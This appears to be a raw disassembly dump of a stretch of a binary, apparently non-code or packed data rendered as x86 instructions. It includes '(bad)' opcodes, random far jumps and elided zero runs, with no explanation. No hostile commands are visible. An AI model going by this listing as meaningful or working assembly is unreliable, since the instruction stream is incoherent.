  423a84:	dec    eax
  423a85:	jns    0x423a31
  423a87:	sti    
  423a88:	adc    ebp,ecx
  423a8a:	pop    eax
  423a8b:	dec    eax
  423a8c:	cdq    
  423a8d:	imul   esi,DWORD PTR [eax],0x52
	...
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	aad    0xe6
  423b02:	popf   
  423b03:	adc    DWORD PTR [esp+edi*2+0x1],edi
  423b07:	add    BYTE PTR [ecx+eax*1],al
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	or     ch,BYTE PTR [ebx*8+0x64ae3b30]
  423b13:	rcl    DWORD PTR [ecx],0x8e
  423b16:	popf   
  423b17:	jo     0x423b01
  423b19:	xlat   BYTE PTR ds:[ebx]
  423b1a:	or     eax,0xb8222454
  423b1f:	sbb    al,0xda
  423b21:	push   esp
  423b22:	les    ebx,FWORD PTR [ebx-0x2723fe93]
  423b28:	jle    0x423b12
  423b2a:	and    esp,DWORD PTR [ebx+0x3d]
  423b2d:	push   edi
  423b2e:	popa   
  423b2f:	lahf   
  423b30:	push   0x5d448021
  423b35:	ins    BYTE PTR es:[edi],dx
  423b36:	retf   0x5237
  423b39:	imul   esi,DWORD PTR [ebx+ecx*1],0x15
  423b3d:	and    al,0x6e
  423b3f:	mov    ch,0x99
  423b41:	pushf  
  423b42:	ror    BYTE PTR [ecx-0x4d2dd948],1
  423b48:	jbe    0x423b23
  423b4a:	shr    BYTE PTR [ecx+0x690322ee],1
  423b50:	sub    eax,0x18bce84f
  423b55:	push   edi
  423b56:	bound  esi,QWORD PTR [edi+0x38]
  423b59:	mov    cl,0x21
  423b5b:	dec    esi
  423b5c:	mov    edi,DWORD PTR [edi+0x6d]
  423b5f:	inc    esi
  423b60:	test   al,0x4b
  423b62:	mov    edi,0x5ca7b8f2
  423b67:	dec    edi
  423b68:	ret    0xe247
  423b6b:	and    ecx,edx
  423b6d:	mov    esp,0x466a7566
  423b72:	sbb    al,0xcf
  423b74:	sti    
  423b75:	mov    ecx,0x71ba3d5c
  423b7a:	or     DWORD PTR [eax+eax*1-0xf58d58e],edx
  423b81:	xor    bh,BYTE PTR [eax-0x6f]
  423b84:	cmp    DWORD PTR [esi+0x3c726eee],0x761e8a19
  423b8e:	retf   
  423b8f:	xor    al,BYTE PTR [ebp-0x7c0665d5]
  423b95:	in     eax,dx
  423b96:	adc    BYTE PTR [eax+0x37],0x5d
  423b9a:	loop   0x423bb0
  423b9c:	shl    eax,0x53
  423b9f:	les    eax,FWORD PTR [edx-0x68]
  423ba2:	aad    0x30
  423ba4:	mov    bl,0x5a
  423ba6:	adc    dl,BYTE PTR [ebx-0x3e]
  423ba9:	js     0x423be5
  423bab:	cmp    eax,0x5e94b5c2
  423bb0:	mov    esp,0x1b922566
  423bb5:	es xchg edx,eax
  423bb7:	mov    ch,BYTE PTR [ebp+0x26]
  423bba:	lds    esp,FWORD PTR [edi-0x61]
  423bbd:	cwde   
  423bbe:	inc    esi
  423bbf:	and    dl,BYTE PTR [edi-0x72286d0f]
  423bc5:	aam    0xa3
  423bc7:	lea    edi,[ecx]
  423bc9:	pop    esp
  423bca:	xor    DWORD PTR [eax-0x68],esi
  423bcd:	cwde   
  423bce:	(bad)  
  423bcf:	lahf   
  423bd0:	icebp  
  423bd1:	sbb    al,0x7d
  423bd3:	sbb    eax,0x829a8a2f
  423bd8:	cli    
  423bd9:	aam    0x1e
  423bdb:	mov    al,ds:0xa12dff46
  423be0:	repnz xor ch,BYTE PTR [ecx]
  423be3:	imul   edi,DWORD PTR [edx-0x41],0xffffffa6
  423be7:	addr16 mov bh,0x50
  423bea:	int    0x54
  423bec:	inc    edi
  423bed:	int    0x1c
  423bef:	xor    DWORD PTR [ebx+ebp*1],0x833c807d
  423bf6:	das    
  423bf7:	imul   edx,DWORD PTR [eax],0xe942d97
  423bfd:	cli    
  423bfe:	mov    al,0x74
  423c00:	retf   
  423c01:	add    ebp,DWORD PTR [edx+0x5d]
  423c04:	sub    dh,BYTE PTR [eax+0x42f90675]
  423c0a:	aad    0xfd
  423c0c:	call   0x0:0x3ee234
	...
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x1e446617]
  423c81:	adc    BYTE PTR [ebx+ebp*1],0x80
  423c85:	jge    0x423c88
  423c87:	add    BYTE PTR [ecx+eax*1],al
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	popf   
  423c8d:	into   
  423c8e:	jbe    0x423c89
  423c90:	call   0xe6edde64
  423c95:	sub    eax,0x9fde4ca8
  423c9a:	mov    ds:0xffd28e3e,al
  423c9f:	mov    ch,0x38
  423ca1:	mov    dh,BYTE PTR [eax-0x3a]
  423ca4:	aaa    
  423ca5:	cld    
  423ca6:	bound  ebx,QWORD PTR [ebx+0x4e]
  423ca9:	or     eax,0x66e8c6d3
  423cae:	add    DWORD PTR [ecx],edx
  423cb0:	cmp    dl,bh
  423cb2:	or     edi,DWORD PTR [eax-0x5b]
  423cb5:	ins    DWORD PTR es:[edi],dx
  423cb6:	add    BYTE PTR [ebx+0x46e43762],0x2d
  423cbd:	inc    ebx
  423cbe:	aam    0xe6
  423cc0:	scas   eax,DWORD PTR es:[edi]
  423cc1:	xor    eax,0xb65dbbee
  423cc6:	sbb    al,BYTE PTR [edx-0x29]
  423cc9:	adc    ebp,DWORD PTR [esi]
  423ccb:	cmp    BYTE PTR [ecx+ecx*8],0xc6
  423ccf:	neg    cl
  423cd1:	or     bl,al
  423cd3:	stos   BYTE PTR es:[edi],al
  423cd4:	push   edi
  423cd5:	mov    ebx,0xc099db9d
  423cda:	imul   ebx,DWORD PTR [edi-0x171756a2],0x672cbcee
  423ce4:	clc    
  423ce5:	data16 adc BYTE PTR [edx],dl
  423ce8:	out    0x3e,al
  423cea:	pop    esi
  423ceb:	pushf  
  423cec:	(bad)  
  423ced:	mov    DWORD PTR es:[edx+0x40],ecx
  423cf1:	test   DWORD PTR [edi],ebx
  423cf3:	rol    DWORD PTR [ebx-0x49],cl
  423cf6:	dec    edx
  423cf7:	lds    ebx,FWORD PTR [edx]
  423cf9:	mov    esi,0x27f6ad1a
  423cfe:	fs sub eax,0xea18ecb3
  423d04:	sahf   
  423d05:	add    eax,0x8409680
  423d0a:	sub    dl,BYTE PTR ss:[eax+ecx*2-0x57ed6ef9]
  423d12:	pop    esi
  423d13:	mov    edx,0x1ebcb55
  423d18:	sub    ax,0x3173
  423d1c:	jge    0x423ca8
  423d1e:	mov    ebx,0x982ee970
  423d23:	fwait
  423d24:	sbb    bh,dl
  423d26:	iret   
  423d27:	xchg   esp,eax
  423d28:	int3   
  423d29:	stos   BYTE PTR es:[edi],al
  423d2a:	std    
  423d2b:	push   0x27fcb407
  423d30:	jb     0x423d25
  423d32:	jno    0x423d28
  423d34:	push   ds
  423d35:	cwde   
  423d36:	jmp    0xe3f6ec7b
  423d3b:	out    dx,al
  423d3c:	fst    DWORD PTR [ecx-0x59a74806]
  423d42:	aad    0xc7
  423d44:	jmp    0x423da8
  423d46:	push   cs
  423d47:	leave  
  423d48:	outs   dx,BYTE PTR ds:[esi]
  423d49:	mov    dl,0xa3
  423d4b:	imul   eax
  423d4d:	pop    esp
  423d4e:	and    eax,0xa4815526
  423d53:	pop    edx
  423d54:	mov    ah,0xcb
  423d56:	aad    0x4f
  423d58:	mov    ecx,0x55ca5b1b
  423d5d:	pop    edi
  423d5e:	or     DWORD PTR [esi+0x2ab86755],ecx
  423d64:	xchg   BYTE PTR [esi-0x53],bh
  423d67:	or     bh,al
  423d69:	inc    edx
  423d6a:	xlat   BYTE PTR ds:[ebx]
  423d6b:	xor    ecx,DWORD PTR [ecx-0x4e]
  423d6e:	inc    edx
  423d6f:	dec    edx
  423d70:	xor    eax,0x79e6953b
  423d75:	popf   
  423d76:	jbe    0x423d7c
  423d78:	es inc esp
  423d7a:	push   ecx
  423d7b:	int    0xd0
  423d7d:	mov    dl,0xd9
  423d7f:	sub    ebp,DWORD PTR [ecx]
  423d81:	cdq    
  423d82:	into   
  423d83:	add    al,0x1c
  423d85:	mov    bl,0x5e
  423d87:	arpl   WORD PTR [edx-0x7cbf09ef],ax
  423d8d:	neg    DWORD PTR [eax+ebp*1+0x0]
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x66e159d2],esp
  423e03:	data16 test BYTE PTR [esi+0x1],bh
  423e07:	add    BYTE PTR [ecx+eax*1],al
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	jbe    0x423e70
  423e0e:	cmp    dh,bh
  423e10:	daa    
  423e11:	(bad)  
  423e12:	out    dx,al
  423e13:	mov    BYTE PTR [esi+0x8d9b748],ah
  423e19:	stos   DWORD PTR es:[edi],eax
  423e1a:	pop    edi
  423e1b:	adc    ecx,esp
  423e1d:	clc    
  423e1e:	daa    
  423e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e20:	sub    BYTE PTR ds:[ebx+0x5e52aade],dh
  423e27:	dec    DWORD PTR [edi+0x2592b8d2]
  423e2d:	std    
  423e2e:	xlat   BYTE PTR ds:[ebx]
  423e2f:	jne    0x423df4
  423e31:	sbb    dh,dl
  423e33:	add    edx,eax
  423e35:	mov    ?,WORD PTR [ebp+0x41]
  423e38:	add    al,0x52
  423e3a:	retf   
  423e3b:	xchg   ebx,eax
  423e3c:	ret    0x90a9
  423e3f:	enter  0x6199,0x27
  423e43:	fiadd  WORD PTR [edx-0x49]
  423e46:	jp     0x423e45
  423e48:	out    0xd9,al
  423e4a:	and    ebx,DWORD PTR ds:[ebp+0x46989163]
  423e51:	cdq    
  423e52:	xchg   edx,eax
  423e53:	sub    al,0x2
  423e55:	mov    DWORD PTR [eax+edx*2-0x37],esi
  423e59:	ds ins BYTE PTR es:[edi],dx
  423e5b:	jae    0x423eb1
  423e5d:	inc    ecx
  423e5e:	jb     0x423e09
  423e60:	jmp    DWORD PTR [ecx]
  423e62:	pop    ebp
  423e63:	add    DWORD PTR [esi],ecx
  423e65:	arpl   WORD PTR ds:0xf9480560,si
  423e6b:	xor    bh,0xcc
  423e6e:	jo     0x423e66
  423e70:	enter  0x7b76,0x68
  423e74:	mov    esi,0xeb3ba6f5
  423e79:	mul    bh
  423e7b:	or     DWORD PTR [eax*2-0x55b60645],ebx
  423e82:	push   es
  423e83:	xchg   BYTE PTR [ebx-0x32],dl
  423e86:	gs retf 
  423e88:	fiadd  DWORD PTR [eax-0x69]
  423e8b:	jmp    0x61ee:0xc65d10a6
  423e92:	and    al,0xe8
  423e94:	xchg   ecx,eax
  423e95:	adc    DWORD PTR [ebx],ecx
  423e97:	mov    esp,0x55d7a9d3
  423e9c:	gs ret 0x3fe1
  423ea0:	mov    WORD PTR [edi+0x30194e46],fs
  423ea6:	rsqrtps xmm7,XMMWORD PTR [ecx]
  423ea9:	xchg   ebx,eax
  423eaa:	sub    ch,bl
  423eac:	cmp    DWORD PTR [ebx-0xd5861c1],ebp
  423eb2:	and    BYTE PTR [ecx+0x24],dh
  423eb5:	(bad)  
  423eb6:	and    DWORD PTR [esi],esi
  423eb8:	dec    edi
  423eb9:	js     0x423f07
  423ebb:	pop    ebx
  423ebc:	push   fs
  423ebe:	mov    ah,0xaa
  423ec0:	pusha  
  423ec1:	sub    eax,0xf50e2e8f
  423ec6:	push   ecx
  423ec7:	xchg   esp,eax
  423ec8:	popa   
  423ec9:	in     al,dx
  423eca:	xor    DWORD PTR [eax-0x25],ebp
  423ecd:	adc    BYTE PTR [ecx-0x3be9e7bc],bl
  423ed3:	rcl    BYTE PTR [ebx],1
  423ed5:	push   edx
  423ed6:	mov    cl,0x4a
  423ed8:	dec    ebx
  423ed9:	icebp  
  423eda:	mov    edx,0x1453149f
  423edf:	dec    esp
  423ee0:	xor    DWORD PTR [ecx-0x18],ebp
  423ee3:	ret    0xe349
  423ee6:	sbb    cl,BYTE PTR [eax-0x414aa6d0]
  423eec:	push   ecx
  423eed:	and    DWORD PTR [eax-0x5ff3917f],ebp
  423ef3:	out    0xf7,eax
  423ef5:	out    0xcc,eax
  423ef7:	out    dx,al
  423ef8:	xchg   BYTE PTR [esi+0x48],bl
  423efb:	cld    
  423efc:	xor    edx,DWORD PTR [ebx-0x7beef371]
  423f02:	dec    ecx
  423f03:	jo     0x423f0b
  423f05:	cld    
  423f06:	jne    0x423f16
  423f08:	loope  0x423f85
  423f0a:	rcl    BYTE PTR [eax],1
  423f0c:	scas   eax,DWORD PTR es:[edi]
  423f0d:	and    al,0x4a
  423f0f:	add    BYTE PTR fs:[eax],al
	...
  423f72:	add    BYTE PTR [eax],al
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f81:	add    DWORD PTR [ecx+0x17f88e5],ecx
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	pop    edx
  423f8d:	shr    BYTE PTR [edx-0x3d5284a9],cl
  423f93:	jge    0x423fb7
  423f95:	mov    al,0x94
  423f97:	inc    ebx
  423f98:	xor    esi,DWORD PTR [esi+0x2e]
  423f9b:	sahf   
  423f9c:	mov    esi,0x25dab626
  423fa1:	inc    ebp
  423fa2:	and    esi,0x2f20031a
  423fa8:	rcl    ah,1
  423faa:	cmp    eax,0x6c5c049c
  423faf:	js     0x424011
  423fb1:	push   ecx
  423fb2:	fsub   QWORD PTR [eax]
  423fb4:	inc    ecx
  423fb5:	(bad)  
  423fb6:	loopne 0x423fdc
  423fb8:	cdq    
  423fb9:	shl    BYTE PTR [esi-0x5c],1
  423fbc:	fmul   DWORD PTR [ebx-0x732803cf]
  423fc2:	add    BYTE PTR [edi],bl
  423fc4:	xchg   DWORD PTR fs:[ebx],ebp
  423fc7:	mov    dh,0x8a
  423fc9:	cs push ss
  423fcb:	mov    DWORD PTR [ebx],ecx
  423fcd:	test   BYTE PTR [edx-0x4d],al
  423fd0:	push   ds
  423fd1:	adc    DWORD PTR [ebx+0x30],eax
  423fd4:	inc    ebp
  423fd5:	cmp    al,0xc
  423fd7:	mov    esi,0x720f5c77
  423fdc:	ins    BYTE PTR es:[edi],dx
  423fdd:	pop    eax
  423fde:	or     al,0xc1
  423fe0:	jmp    0x9b271111
  423fe5:	cs mov esi,0x6ca568cd
  423feb:	jo     0x423fa1
  423fed:	arpl   bp,di
  423fef:	and    BYTE PTR [esi-0x2c],al
  423ff2:	mov    ch,0x7b
  423ff4:	mov    cl,0xa5
  423ff6:	mov    es,ebx
  423ff8:	mov    dh,0xbe
  423ffa:	int    0xab
  423ffc:	xchg   ebp,eax
  423ffd:	rcl    dl,0xe5
  424000:	idiv   BYTE PTR [ebp-0x4b92e158]
  424006:	dec    ebx
  424007:	push   esp
  424008:	inc    esp
  424009:	xor    eax,0xea7de103
  42400e:	sub    DWORD PTR [ebp+0x19],0xffffff85
  424012:	push   esp
  424013:	mov    al,0x67
  424015:	stos   BYTE PTR es:[edi],al
  424016:	loop   0x423fab
  424018:	and    DWORD PTR es:[ebx-0x176b0a68],0x54
  424020:	cmp    eax,0x50316cbb
  424025:	sub    DWORD PTR [edx+eax*1+0x734483a6],ebx
  42402c:	mov    al,0x8a
  42402e:	clc    
  42402f:	stos   DWORD PTR es:[edi],eax
  424030:	dec    ecx
  424031:	test   edx,ebp
  424033:	in     eax,0x75
  424035:	jle    0x424045
  424037:	dec    eax
  424038:	out    0xf5,al
  42403a:	sub    al,BYTE PTR [ebp+0x42]
  42403d:	add    dl,ah
  42403f:	leave  
  424040:	xchg   ecx,eax
  424041:	cmp    eax,0x26c23d85
  424046:	sbb    bh,BYTE PTR [ebp-0x71aa37cf]
  42404c:	ins    DWORD PTR es:[edi],dx
  42404d:	xlat   BYTE PTR ds:[ebx]
  42404e:	lods   al,BYTE PTR ds:[esi]
  42404f:	iret   
  424050:	inc    ecx
  424051:	adc    DWORD PTR [ebx+0x4272865],eax
  424057:	jle    0x4240d8
  424059:	dec    ecx
  42405a:	xchg   ebx,eax
  42405b:	jmp    0x3aa8:0x1c2b1591
  424062:	(bad)  
  424063:	mov    ah,0xe6
  424065:	call   0x2e65:0xe4c06227
  42406c:	add    edx,DWORD PTR [ecx+0x272e2b0e]
  424072:	pusha  
  424073:	jmp    0xf2a69410
  424078:	push   edi
  424079:	loop   0x424051
  42407b:	jmp    0x4e9f:0x216dd7e6
  424082:	dec    al
  424084:	pop    ebp
  424085:	fisub  WORD PTR [bp+si+0x1]
  424089:	cmp    edi,edx
  42408b:	les    eax,FWORD PTR [ebx+0x72]
  42408e:	cmp    BYTE PTR [ebx+0x0],ch
	...
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	mov    ebp,0x8cca0506
  424105:	add    BYTE PTR [ecx],0x0
  424108:	add    al,0x1
  42410a:	add    BYTE PTR [eax],al
  42410c:	popa   
  42410d:	aaa    
  42410e:	call   0x5b68:0xc7d126b
  424115:	mov    dl,0x1c
  424117:	outs   dx,BYTE PTR ds:[esi]
  424118:	or     DWORD PTR [edi+edx*8],ecx
  42411b:	dec    esi
  42411c:	je     0x4240ab
  42411e:	jno    0x424109
  424120:	mov    ch,0x5f
  424122:	or     eax,0xfcb577a4
  424127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424128:	mov    esi,0x6ffb0504
  42412d:	mov    ch,0xaf
  42412f:	mov    eax,ds:0x1c092791
  424134:	inc    ebx
  424135:	xor    dl,BYTE PTR [ebx+esi*8]
  424138:	jl     0x42417a
  42413a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42413b:	fadd   st,st(5)
  42413d:	mov    dl,0xf3
  42413f:	xchg   esi,ebp
  424141:	repnz imul edx,DWORD PTR [ebp+0x10],0xa302a323
  424149:	int    0xab
  42414b:	xchg   ebx,eax
  42414c:	or     al,0xa7
  42414e:	test   al,0x7a
  424150:	imul   BYTE PTR [eax+0x23396ce5]
  424156:	out    0xc7,al
  424158:	pushf  
  424159:	jb     0x42415f
  42415b:	xlat   BYTE PTR ds:[ebx]
  42415c:	xor    BYTE PTR [ebx-0x585af9f3],ch
  424162:	js     0x424120
  424164:	mov    eax,0x91a5ec07
  424169:	scas   al,BYTE PTR es:[edi]
  42416a:	or     cl,BYTE PTR [edi+0x27703f99]
  424170:	push   ebx
  424171:	out    dx,eax
  424172:	push   ecx
  424173:	inc    ebp
  424174:	mov    ebx,0x49955bbc
  424179:	pushf  
  42417a:	lahf   
  42417b:	stc    
  42417c:	push   edi
  42417d:	mov    WORD PTR [ebx+0x4c32068e],cs
  424183:	out    0xd6,al
  424185:	pop    esi
  424186:	inc    ecx
  424187:	or     BYTE PTR [esp+ebp*1+0x7e],dl
  42418b:	jmp    0xe1cd4335
  424190:	add    al,0x48
  424192:	sti    
  424193:	ret    
  424194:	and    DWORD PTR [ecx],esi
  424196:	mov    ah,0x62
  424198:	and    DWORD PTR [eax+0x2deda5c4],0x960e7f2
  4241a2:	mov    eax,0x5dc5f2cd
  4241a7:	mov    al,ds:0xed625134
  4241ac:	or     ebp,edi
  4241ae:	sahf   
  4241af:	int    0x8d
  4241b1:	adc    al,0x62
  4241b3:	imul   esi,eax,0x41b07f0c
  4241b9:	or     ch,BYTE PTR [ebp+0x6ab54502]
  4241bf:	pop    ebx
  4241c0:	fisttp WORD PTR [edx+0x47e0e658]
  4241c6:	mov    bh,0x30
  4241c8:	aad    0xc5
  4241ca:	push   ecx
  4241cb:	xchg   ebp,eax
  4241cc:	loop   0x42419c
  4241ce:	fnstsw WORD PTR ds:0x8cb4b525
  4241d4:	pop    ebp
  4241d5:	cli    
  4241d6:	or     BYTE PTR [ebp-0x17],bl
  4241d9:	lods   al,BYTE PTR ds:[esi]
  4241da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241db:	int3   
  4241dc:	adc    esp,DWORD PTR [ebx-0xd]
  4241df:	(bad)  
  4241e0:	push   ebx
  4241e1:	out    dx,al
  4241e2:	repnz xchg esp,eax
  4241e4:	inc    ebx
  4241e5:	sbb    dh,al
  4241e7:	mov    al,ds:0xa42c6a57
  4241ec:	mov    esp,0xefe3e1cc
  4241f1:	retf   
  4241f2:	xchg   ecx,eax
  4241f3:	adc    al,0x19
  4241f5:	int3   
  4241f6:	sbb    eax,0x15f753e5
  4241fb:	jne    0x42424b
  4241fd:	jge    0x4241db
  4241ff:	adc    al,0x50
  424201:	sbb    eax,0x7b45cbf
  424206:	mov    ecx,0xae5efe5e
  42420b:	mov    esi,0xbafb91ee
	...
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	add    eax,0x90a29133
  424285:	add    DWORD PTR [ecx],0x10400
  42428b:	add    BYTE PTR [edx+eiz*1+0x28],dl
  42428f:	fisub  DWORD PTR ds:0x9d7bb8ac
  424295:	xor    al,0x7b
  424297:	les    eax,FWORD PTR [edx+eax*1-0x692b60e9]
  42429e:	sub    eax,0x1ea36514
  4242a3:	and    BYTE PTR [edx+0x59b5b30d],cl
  4242a9:	(bad)  
  4242aa:	cmp    edx,eax
  4242ac:	push   0x7eca7810
  4242b1:	jl     0x424258
  4242b3:	lods   eax,DWORD PTR ds:[esi]
  4242b4:	mov    dh,BYTE PTR ds:0xbcc1ed7b
  4242ba:	jmp    0x25dd:0xe67d5e69
  4242c1:	out    0x1f,al
  4242c3:	push   es
  4242c4:	(bad)  
  4242c5:	das    
  4242c6:	xchg   esp,eax
  4242c7:	loop   0x4242c1
  4242c9:	pushf  
  4242ca:	xchg   esi,eax
  4242cb:	test   DWORD PTR [ebx-0x4ddce582],0xc248bda9
  4242d5:	stos   DWORD PTR es:[edi],eax
  4242d6:	mov    cl,0x21
  4242d8:	in     al,0x6a
  4242da:	aam    0x9e
  4242dc:	add    al,0x1e
  4242de:	hlt    
  4242df:	aas    
  4242e0:	xor    DWORD PTR [ebp-0x32],0x9dc1ec60
  4242e7:	test   al,0xcb
  4242e9:	jns    0x4242bc
  4242eb:	xchg   edi,eax
  4242ec:	mov    ch,0xb
  4242ee:	into   
  4242ef:	jae    0x42434f
  4242f1:	stos   DWORD PTR es:[edi],eax
  4242f2:	ss (bad) 
  4242f4:	fs push edi
  4242f6:	mov    BYTE PTR [edx-0x7e],bl
  4242f9:	bound  ebx,QWORD PTR [eax]
  4242fb:	mov    BYTE PTR [esi-0x1b],cl
  4242fe:	pop    edi
  4242ff:	jno    0x424367
  424301:	adc    DWORD PTR [esp+ebp*1-0xe],0x76
  424306:	push   ebx
  424307:	(bad)  [ecx-0x19]
  42430a:	aam    0x84
  42430c:	in     eax,0xcc
  42430e:	xchg   BYTE PTR ds:0x11210c28,ch
  424314:	mov    ah,0xc8
  424316:	mov    bh,0x8a
  424318:	loope  0x4242f7
  42431a:	or     esp,DWORD PTR [eax]
  42431c:	xor    eax,0xa2890d49
  424321:	mov    ebp,0xe81a0414
  424326:	test   eax,0xed73312b
  42432b:	jo     0x424307
  42432d:	xchg   esi,eax
  42432e:	sbb    edi,DWORD PTR [ecx-0x6dbb7ee6]
  424334:	push   esi
  424335:	sti    
  424336:	out    dx,al
  424337:	mov    cl,0x5
  424339:	mov    al,0xc6
  42433b:	int3   
  42433c:	popa   
  42433d:	push   cs
  42433e:	pop    edx
  42433f:	out    0x37,eax
  424341:	and    al,0x86
  424343:	or     al,0x8c
  424345:	mov    cl,0xd7
  424347:	fnstcw WORD PTR [ebp-0x34]
  42434a:	jns    0x424368
  42434c:	sub    eax,0x4b82f2da
  424351:	mov    ch,0x89
  424353:	and    al,0x12
  424355:	inc    ecx
  424356:	fidiv  DWORD PTR ds:0x59f39437
  42435c:	shl    bl,cl
  42435e:	inc    ebp
  42435f:	cdq    
  424360:	push   ds
  424361:	sub    edi,DWORD PTR [eax]
  424363:	out    dx,al
  424364:	js     0x424336
  424366:	pop    edi
  424367:	outs   dx,BYTE PTR ds:[esi]
  424368:	xchg   ecx,eax
  424369:	ins    BYTE PTR es:[edi],dx
  42436a:	xchg   edx,eax
  42436b:	stc    
  42436c:	push   ecx
  42436d:	sub    dl,BYTE PTR [edx]
  42436f:	icebp  
  424370:	fisubr WORD PTR [edx]
  424372:	call   DWORD PTR [ecx-0x1]
  424375:	int3   
  424376:	mov    ah,0x62
  424378:	push   0xffffffc1
  42437a:	mov    ebp,0x1c7a14cd
  42437f:	jge    0x42439b
  424381:	inc    ecx
  424382:	mov    ebx,0xeb7a4a7d
  424387:	ins    DWORD PTR es:[edi],dx
  424388:	or     eax,0x6bde8e7b
  42438d:	push   cs
  42438e:	push   ebx
  42438f:	js     0x424391
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x424384
  424401:	pop    ds
  424402:	mov    edx,esp
  424404:	xchg   esp,eax
  424405:	add    BYTE PTR [ecx],0x0
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	push   ebp
  42440d:	pop    edi
  42440e:	sar    ebp,0xa
  424411:	sub    DWORD PTR [ecx+0x2df888b5],ecx
  424417:	push   0xffffff9c
  424419:	(bad)  
  42441a:	push   esp
  42441b:	adc    BYTE PTR [ecx],bl
  42441d:	xchg   edi,esi
  42441f:	cmp    al,dh
  424421:	into   
  424422:	clc    
  424423:	inc    ebx
  424424:	mov    eax,ds:0x86aff9d1
  424429:	fdiv   DWORD PTR [ebx-0x4f]
  42442c:	mov    bh,0xea
  42442e:	out    0x9a,eax
  424430:	pop    esi
  424431:	push   ebp
  424432:	data16 lods al,BYTE PTR ds:[esi]
  424434:	xchg   ebx,ebp
  424436:	ds jmp 0x40646beb
  42443c:	jb     0x424462
  42443e:	nop
  42443f:	dec    eax
  424440:	out    dx,eax
  424441:	hlt    
  424442:	push   ebp
  424443:	xor    bl,dh
  424445:	pop    esp
  424446:	ss mov bl,0xa6
  424449:	rcr    BYTE PTR [eax-0x52],0x69
  42444d:	ret    0x4124
  424450:	loop   0x4244c7
  424452:	or     ebp,DWORD PTR fs:[edx+ecx*8+0x5600c5d1]
  42445a:	adc    DWORD PTR [ecx-0x2207d393],esi
  424460:	xchg   esi,eax
  424461:	dec    esi
  424462:	pop    esp
  424463:	call   0x4aa04818
  424468:	mov    al,ds:0x3917f2d5
  42446d:	sbb    esi,DWORD PTR [esi-0x33]
  424470:	loop   0x4244bf
  424472:	cmp    edx,DWORD PTR [edi-0x39]
  424475:	sti    
  424476:	int3   
  424477:	or     bh,BYTE PTR [edx]
  424479:	imul   ecx,eax,0xc57e5960
  42447f:	adc    DWORD PTR [eax-0x6],0x39d3368d
  424486:	fst    QWORD PTR [eax]
  424488:	call   0x8db9:0x4cb063af
  42448f:	loop   0x4244da
  424491:	xchg   esp,eax
  424492:	in     al,0x14
  424494:	out    dx,eax
  424495:	push   0x3322ee8b
  42449a:	(bad)  
  42449b:	sub    al,0x54
  42449d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42449e:	es loopne 0x424476
  4244a1:	pop    edx
  4244a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244a3:	mov    ecx,0x7291c7f6
  4244a8:	fistp  QWORD PTR [ecx+0x4c]
  4244ab:	adc    ax,0x65eb
  4244af:	daa    
  4244b0:	push   ds
  4244b1:	fnstenv [edi]
  4244b3:	dec    esp
  4244b4:	sbb    BYTE PTR [ebx],dh
  4244b6:	push   ds
  4244b7:	adc    DWORD PTR [ecx+esi*2],esp
  4244ba:	sub    al,0x94
  4244bc:	mov    dl,0xb6
  4244be:	xor    DWORD PTR [ebx],edx
  4244c0:	dec    BYTE PTR [ebp+0x54]
  4244c3:	retf   
  4244c4:	popa   
  4244c5:	dec    ebp
  4244c6:	test   ah,bl
  4244c8:	fwait
  4244c9:	push   eax
  4244ca:	add    al,ah
  4244cc:	leave  
  4244cd:	sbb    al,0x2c
  4244cf:	xchg   ecx,eax
  4244d0:	hlt    
  4244d1:	inc    ebx
  4244d2:	(bad)  
  4244d4:	jmp    0x561b:0xee3faeda
  4244db:	sub    al,0x6f
  4244dd:	clc    
  4244de:	leave  
  4244df:	shr    ch,1
  4244e1:	inc    edx
  4244e2:	retf   0x25b1
  4244e5:	ret    
  4244e6:	xchg   ecx,eax
  4244e7:	adc    ch,BYTE PTR [edx+0x53a526e8]
  4244ed:	mov    cl,0x81
  4244ef:	sub    BYTE PTR [ecx-0x2c],0xf8
  4244f3:	or     dh,BYTE PTR [ecx+0x2a3b76e8]
  4244f9:	data16 cld 
  4244fb:	mov    ecx,0xde48a700
  424500:	push   es
  424501:	push   ecx
  424502:	dec    ebp
  424503:	jno    0x4244d8
  424505:	fidiv  DWORD PTR [ebx]
  424507:	add    al,0xac
  424509:	jnp    0x424552
  42450b:	(bad)  
  42450c:	push   ds
  42450d:	out    0x65,al
  42450f:	add    al,0x0
	...
  424571:	add    BYTE PTR [eax],al
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
